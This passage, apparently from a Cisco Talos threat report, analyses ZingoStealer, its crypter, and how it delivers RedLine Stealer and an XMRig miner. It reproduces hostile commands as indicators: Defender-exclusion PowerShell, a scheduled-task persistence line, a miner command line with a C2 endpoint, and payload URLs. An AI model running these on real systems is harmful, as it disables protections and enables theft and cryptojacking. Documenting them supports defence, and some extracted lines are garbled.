The group also operates a similar collaborative Discord server where new tooling is\noften shared to enable members to launch more successful intrusions, improve antivirus evasion capabilities and otherwise disseminate\ntactics, techniques and procedures.\n\nThese communities consist of thousands of members and demonstrate that financially motivated cybercrime is increasingly attractive to many\npeople around the world. The core members of this crimeware group are likely located in Eastern Europe, and many of the announcements\nand other communications are written in Russian.\n\n## Introduction to ZingoStealer\n\nIn early March 2022, while monitoring the communications between members of Haskers Gang, we observed the announcement of the\navailability of a new information stealer called \"ZingoStealer.\" This new malware was advertised as being freely available to members of the\nHaskers Gang Telegram community.\n\n_ZingoStealer release announcement._\n\nSince this announcement, we have observed a steady volume of ZingoStealer samples being uploaded to various malware repositories.\n\nThe malware is offered in two \"tiers\" of options, with both versions of the malware precompiled and delivered via a Telegram channel.\n\n\n-----\n\n_ZingoStealer and exoCrypt crypter integration._\n\nFor 300 Rubles (~$3 USD), Haskers Gang also offers a pre-built option that leverages their crypter, which they refer to as \"ExoCrypt.\" This\nallows affiliates to take advantage of antivirus evasion without requiring them to use a third-party builder to package the malware prior to\ndistributing it.\n\nDuring our analysis of ZingoStealer, we observed the malware author behind the stealer incorporating the XMRig cryptocurrency mining\nsoftware into the stealer to further monetize their efforts by using systems infected by affiliates to generate Monero for the malware author.\n\n_Miner release announcement sent to the channel on March 18._\n\nWhile researching ZingoStealer, we observed additional functionality, cryptocurrency theft support, and other features added frequently,\nindicating that this threat will likely continue to evolve and mature over time.\n\n### Distribution campaigns\n\nAs this stealer is being made available for free to members of the Haskers Gang community, it is likely being leveraged by a variety of\notherwise unrelated threat actors using various techniques to infect potential victims. We have observed a steady volume of new samples in\nthe wild and expect that this trend will continue. In many cases, ZingoStealer is currently being distributed under the guise of game cheats,\ncracks and code generators.\n\nIn one example, the malware was being distributed under the guise of a game modification utility for \"Counter-Strike: Global Offensive.\" The\nthreat actor posted a YouTube video demonstrating use of a tool purported to mod the popular video game. The video description contained a\nlink to the tool hosted on Google Drive.\n\n\n-----\n\n_YouTube video description._\n\nThe hyperlink points to a password-protected RAR archive stored in Google Drive that contains an executable called \"loader.exe.\" This\nexecutable is responsible for infecting the system with ZingoStealer.\n\n_Google Drive content._\n\nThe video itself was posted well before the initial announcement of the availability of ZingoStealer, however, the modified date for the content\nhosted on Google Drive was March 22, 2022. This indicates that the hyperlinks in the video descriptions may be updated over time at the\nattacker's discretion.\n\nIn many cases, the ZingoStealer executable was observed being hosted on the Discord CDN, following naming conventions similar to the\nfollowing examples:\n\nhXXps://cdn[.]discordapp[.]com/attachments/960542241498210334/960544850158166027/2_5357301132811048430.exe\n\nhxxps://cdn[.]discordapp[.]com/attachments/960542241498210334/960542756156100708/2_5357488762752341390.exe\n\nhxxps://cdn[.]discordapp[.]com/attachments/941227101351215104/960556192931938304/loader_cheat_for_roblox.exe\n\nhxxps://cdn[.]discordapp[.]com/attachments/810482847340429352/960156304029151302/Ginzo.exe\n\nThis may indicate threat actors are also distributing the malware within gaming-related Discord servers under the guise of video game cheats.\n\n### Other Haskers Gang campaigns\n\nIn another example we observed a threat actor posting a YouTube video purporting to be a way to obtain free plugins for Adobe applications\n\n\n-----\n\n_Haskers Gang video announcement._\n\nThe video description contained a link to a supposed tool which used the Bitly URL-shortening service. When clicked, the victim is redirected\nto a password-protected ZIP archive containing a malicious Windows executable hosted on the Mega[.]nz file-sharing website. The\nexecutable is packed and drops the RedLine information stealer on victims' systems.\n\nThe threat actor behind this distribution campaign also invited members of the Haskers Gang Telegram channel to post positive comments in\nEnglish to add legitimacy to the video and associated hyperlinks.\n\nThis is a secondary payload we've frequently observed coinciding with ZingoStealer infections. In many cases, ZingoStealer retrieves a list of\nURLs hosted on the C2 server as \"ginzolist.txt.\" The malware then attempts to retrieve the payloads hosted at these URLs, one of the most\ncommon being RedLine. We've also frequently observed XMRig being delivered to systems infected with ZingoStealer.\n\n## ZingoStealer execution\n\nThe stealer is an obfuscated .NET executable. When executed on victim systems, it attempts to retrieve various .NET dependencies that\nprovide core functionality used by the malware from an attacker-controlled server.\n\nThe dependencies retrieved by the malware include:\n\nBouncyCastle.Crypto\nDotNetZip\nNewtonSoft.Json\nSQLite.Interop (For both x86 and x64)\nSystem.Data.SQLite\n\n_.NET component retrieval._\n\nThe retrieved DLL files are then stored in the directory from which the malware is currently running. In the case of SQLite.Interop.dll, the\nmalware retrieves the x86 and x64 versions and creates a subdirectory for each architecture before storing the retrieved binaries.\n\n\n-----\n\n_.NET component directory._\n\nThe stealer then creates a directory structure which is used to collect and save sensitive information that is later exfiltrated to the attacker.\nThe location for this directory structure is:\n\nC:\\Users\\<USERNAME>\\AppData\\Local\\GinzoFolder\n\nWithin this directory, the malware creates subfolders to store various types of information that is collected by the malware. These\nsubdirectories include:\n\nBrowsers\nWallets\nDesktop Files\n\nZingoStealer then begins the system enumeration and data collection process, starting by taking a screenshot of the victim's system and\nstoring it as a PNG called \"Screenshot.PNG\" within the directory that was created earlier.\n\nNext the malware begins to identify and collect sensitive information stored by web browsers installed on the system. This includes saved\nlocal data, cookies, login data, etc.\n\nIt supports the major web browsers, including:\n\nGoogle Chrome\nMozilla Firefox\nOpera\nOpera GX\n\nDiscovered information is saved within the directory structure we described previously.\n\nThe malware also attempts to enumerate environmental and system information. This data is saved within a text file called \"system.txt\" which\nis also stored within the data staging directory and includes:\n\nIP address\nComputer name\nUsername\nOS version\nLocalization information\nProcessor information\nSystem memory\nScreen resolution\nStart time\n\nNext, ZingoStealer attempts to collect sensitive information, including user account tokens for collaboration software that may be installed,\n[including Discord and Telegram. As mentioned in our previous research related to abuse of collaboration platforms, this information can be](https://blog.talosintelligence.com/2021/04/collab-app-abuse.html)\nused to impersonate users, obtain victim account information, or otherwise abuse these platforms and their users.\n\nZingoStealer also attempts to access information related to Chrome extensions that may be present within the victim's web browser. This\ninformation is gathered from the following location:\n\nC:\\Users\\<USERNAME>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\<CHROME_EXTENSION_ID>\n\nThe malware specifically searches for extension data associated with the following cryptocurrency wallet extensions.\n\nTronLink\nNifty Wallet\nMetaMask\nMathWallet\nCoinbase Wallet\nBinance Wallet\n\n\n-----\n\na e a et\nGuarda\nEQUAL Wallet\nBitApp Wallet\niWallet\nWombat - Gaming Wallet\n\nZingoStealer then searches %APPDATA%\\Local and %APPDATA%\\Roaming for cryptocurrency wallet data associated with the following\ncryptocurrencies.\n\nZcash\nArmory\nBytecoin\nJaxx Liberty\nExodus\nEthereum\nElectrum\nAtomic\nGuarda\nCoinomi\n\nIt also queries the registry (HKCU\\SOFTWARE\\<VALUE>) to identify settings associated with additional cryptocurrency wallets, including:\n\nBitcoin\nDash\nLitecoin\n\nAny files or directories present within the infected user's Desktop folder will also be copied to the staging directory. Any data successfully\ncollected throughout this process will be stored in the appropriate subdirectory within the data staging directory. Once the collection process\nhas been completed, DotNetZip creates an archive containing all the information, which is then exfiltrated to an attacker-controlled server.\n\n_Data exfiltration._\n\nThe logs are then processed and delivered to the Haskers Gang Telegram channel so ZingoStealer users can access them.\n\n_Log delivery via Telegram._\n\nThe malware is also used as a loader for other malware payloads.\n\nDuring the execution of the ZingoStealer payload, it retrieves the geolocation of the victim's system using freegeoip[.]app. It then makes an\nHTTP GET request to the C2 server for a resource called \"cis txt \" An example of this can be seen below\n\n\n-----\n\n_CIS check._\n\nThis could be a reference to the Commonwealth of Independent States (CIS). Many financially motivated cybercriminals located in CIS\ncountries actively avoid infecting systems in these countries to avoid attracting local law enforcement attention. Similar behavior is often\nobserved, as ransomware operators often actively avoid targeting organizations located in these countries. In one of the initial\nannouncements related to ZingoStealer, the malware author mentioned that, while CIS filtering is available, it is not currently in place, but it\nmay be activated in the future based on local law enforcement attention.\n\nFollowing the geolocation check, the malware requests a list of URLs that it uses to retrieve and execute additional malware payloads, at the\ndiscretion of the attacker.\n\n_Secondary payload list retrieval._\n\nThis list of URLs is saved into a text file called \"ginzolist.txt\" that is saved within the %APPDATA%\\Local directory on the victim system. The\nmalware then retrieves the additional malware payloads hosted at these URLs and saves them within the %APPDATA%\\Local directory. An\nexample of this can be seen below.\n\n_Secondary payload binary retrieval._\n\n\n-----\n\nt s pa t cu a case, t e b a y s eet e e as assoc ated t ed e Stea e a d sa ed at C \\Use s\\\n<USERNAME>\\AppData\\Local\\536075.exe.\n\nWhile \"antiwm.exe\" was associated with an injector for the XMRig cryptocurrency miner and saved at C:\\Users\\\n<USERNAME>\\AppData\\Local\\209625.exe.\n\nThe retrieved binary payloads then continue the infection process.\n\n## ExoCrypt crypter\n\nAs previously mentioned, the malware author responsible for ZingoStealer also offers a crypter service that allows ZingoStealer users to\nobtain encrypted ZingoStealer builds that assist with evading endpoint detection on systems. We identified a binary loader for ZingoStealer\nthat may be related to the use of this crypter.\n\n_Sample metadata._\n\nThe functionality of the code is straightforward: It is responsible for implementing a randomized sleep interval before decrypting the contents\nof the ZingoStealer binary and saving the decrypted contents as %TEMP%\\ChromeHandler.exe. It then executes the ZingoStealer binary,\ninitiating the normal infection process previously described.\n\n_Main() function._\n\nTo decrypt the ZingoStealer binary, it retrieves the data from a resource present within the executable called \"zvezdy\" and stores it within an\narray.\n\n_Zvezdy resource contents._\n\nIt then iterates through the array and performs a modulo operation on each of the values. Based on the results of the operation, each byte is\nconverted into the appropriate value and stored within a second array. An example of the Decryption() function is shown below.\n\n\n-----\n\n_Decryption() function._\n\nFinally, the second array is passed back to the Main() function, saved to disk as ZingoStealer, and executed to continue the infection process.\n\n## RedLine Stealer\n\n[One of the secondary payloads delivered and executed by ZingoStealer is RedLine Stealer, a well-known information stealer that has been](https://malpedia.caad.fkie.fraunhofer.de/details/win.redline_stealer)\nanalyzed extensively over the past couple of years. It features significantly more support for retrieving data from various applications,\nbrowsers, cryptocurrency wallets and extensions.\n\nBelow is a basic comparison between the two stealers as it relates to supported applications from which the malware can retrieve sensitive\ndata to be exfiltrated to the attacker.\n\n\n-----\n\n_Stealer feature comparison._\n\nGiven that RedLine Stealer seems to provide more capabilities, why would an adversary use ZingoStealer to deliver RedLine Stealer?\n\nBesides ZingoStealer, the malware author also offers additional services that they advertise within the Haskers Gang community. One service\nis a \"log access service\" used to monetize information stealer logs obtained from previously infected systems. Customers can purchase\naccess to the log data generated from various stealers operated by the attacker, which provides them sensitive account information that can\n\n\n-----\n\nbe u t e e e aged o a a ety o pu poses c ud g t a access, aud, etc\n\n_Advertisement for the logging service._\n\nThe malware author behind ZingoStealer assures ZingoStealer users that they do not access log data generated by ZingoStealer.\n\n_Actor's assurance they do not take interest in the uploaded stolen logs._\n\nHowever, by effectively backdooring ZingoStealer and using it to deliver RedLine Stealer, they can still take advantage of the infections\nachieved by ZingoStealer users. This allows them to let ZingoStealer users perform the heavy lifting in terms of malware distribution, antivirus\nevasion, and achieving successful infections, while they passively collect more comprehensive logs from the systems. This also allows them\nto monetize the infections of all ZingoStealer users simultaneously, maximizing profitability.\n\nThe RedLine Stealer configuration extracted from analyzed samples contained the following parameters.\n\n{\"ip\": \"193[.]38[.]235[.]228:45347\", \"xor_key\": \"Zag\", \"id\": \"keepye\"}\n\nThe value \"keepye\" stored within the ID field of the configuration matches the username associated with an individual suspected to be behind\ndevelopment of ZingoStealer.\n\n\n-----\n\n_Threat actor social media profile._\n\n## ZingoMiner (XMRig)\n\nIn addition to RedLine Stealer, ZingoStealer also delivers the XMRig cryptocurrency mining malware to victims. This is another way the\nmalware author behind ZingoStealer is attempting to monetize the operations of ZingoStealer users.\n\nThis was confirmed when the author of ZingoStealer published an announcement within the Haskers Gang Telegram group informing the\ncommunity that they had added XMRig to a new version of ZingoStealer as previously described.\n\nAs mentioned, the main binary payload associated with the mining malware is retrieved and executed by ZingoStealer during the initial\ninfection process. It is then executed using conhost.exe as shown below.\n\n\"C:\\Windows\\System32\\conhost.exe\" \"C:\\Users\\<USERNAME>\\AppData\\Local\\209625.exe\"\n\nOnce executed, it invokes PowerShell using the EncodedCommand option, specifying Base64-encoded PowerShell commands to execute.\n\ncmd /c powershell -EncodedCommand\n\"QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEAAKAAkAGUA\n& powershell -EncodedCommand\n\"QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4ARQB4AHQAZQBuAHMAaQBvAG4A\n& exit\"\n\nThis PowerShell is responsible for creating two exclusions in the Windows Defender configuration on the system.\n\n\n-----\n\ndd p e e e ce c us o at @($e Use o e,$e Syste e) o ce\nAdd-MpPreference -ExclusionExtension @('exe','dll') -Force\n\nIt also attempts to achieve persistence for the miner, ensuring that it is executed following system reboots. This is accomplished by creating a\nnew scheduled task using the following syntax:\n\nschtasks /create /f /sc onlogon /rl highest /tn \"updater\" /tr \"C:\\Users\\<USERNAME>\\AppData\\Roaming\\Chrome\\updater.exe\"\n\nFinally, the malware copies itself from its initial starting location to match the path defined in the scheduled task, and then executes the newly\ncreated executable.\n\n\"C:\\Windows\\System32\\conhost.exe\" \"C:\\Users\\<USERNAME>\\AppData\\Roaming\\Chrome\\updater.exe\"\n\nThis executable is also responsible for creating and executing a binary located at:\n\nC:\\Users\\<USERNAME>\\AppData\\Roaming\\Windows\\Telemetry\\sihost64.exe\n\nIt also creates a file at the following location:\n\nC:\\Users\\<USERNAME>\\AppData\\Roaming\\Windows\\Libs\\WR64.sys\n\nFinally, it invokes explorer.exe with the following parameters.\n\nC:\\Windows\\explorer.exe shpiczjxwdufjl0\nXji3FXYfqqI2timPThbgZueMNpSES88mLhMz2ywydJRha9S4YJkR8/KlqFio/vzAY7y//ZROYnArPXLiffwPB7VSAkqxepfHfbYtEaV9ZbG09TvsFZSe\n\nThis injects XMRig into the explorer.exe process and begins the cryptocurrency mining operations. The XMRig client is launched with the\nfollowing command line parameters:\n\n\\Windows\\explorer.exe --algo=rx/0 --randomx-no-rdmsr --url=pool[.]hashvault[.]pro:80 -user=47tAzTKZcJuCui5Bx2FPVoA7UvWoz1QvRCFF1Bpvej5yGJuPPBgqTC8NG95Q3sMwsYV34eonCD3RVSEpSdhxaPRKSiagNNi -pass= --cpu-max-threads-hint=30 --cinit-stealth-targets=\"Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe\" --cinitapi=\"hxxps://control[.]nominally[.]ru/api/endpoint.php\" --tls --cinit-idle-wait=5 --cinit-idle-cpu=90\n\nInfected systems periodically send beacon data to the API specified when XMRig was launched. These beacons are consistent with the\nfollowing example:\n\n{\"computername\":\"<HOSTNAME>\",\"username\":\"<HOSTNAME>\",\"gpu\":\"<REDACTED>\",\"remoteconfig\":\"\",\"type\":\"xmrig\",\"status\":4,\"uqhash\":\"\n<REDACTED>\"}\n\nInvestigating the pool address specified by the malware shows that the hash rate has continued to increase as more systems are infected\nwith ZingoStealer, however it has not proven to be very lucrative thus far.\n\n\n-----\n\n_Mining Pool Statistics_\n\n## Conclusion\n\nZingoStealer is a relatively new information stealer being offered for free to members of the Haskers Gang Telegram group. It features the\nability to steal sensitive information from victims and can download additional malware to infected systems. In many cases, this includes the\nRedLine Stealer and an XMRig-based cryptocurrency mining malware that is internally referred to as \"ZingoMiner.\" While the malware is new,\nCisco Talos has observed that it is undergoing consistent development and improvement and that the volume of new samples being observed\nin the wild continues to increase as more threat actors attempt to leverage it for nefarious purposes. In many of the distribution campaigns we\nhave observed associated with ZingoStealer, threat actors appear to be targeting home users and distributing their malware under the guise\nof video game cracks, cheats, and other similar content. Users should be aware of the threats posed by these types of applications and\nshould ensure that they are only executing applications distributed via legitimate mechanisms.\n\n## Coverage\n\nWays our customers can detect and block this threat are listed below.\n\n[Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post.
